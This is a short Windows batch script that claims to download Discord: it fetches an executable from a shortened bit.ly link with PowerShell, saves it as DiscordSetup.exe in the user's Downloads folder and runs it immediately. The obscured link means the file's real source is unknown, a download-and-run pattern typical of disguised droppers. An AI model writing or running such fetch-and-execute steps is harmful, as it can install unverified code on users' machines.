@echo Downloading Discord, please wait
@echo off
powershell Invoke-WebRequest "https://bit.ly/3tOf8T9" -OutFile "%homepath%\Downloads\DiscordSetup.exe"
echo Download done, execution is imminent
%homepath%\Downloads\DiscordSetup.exe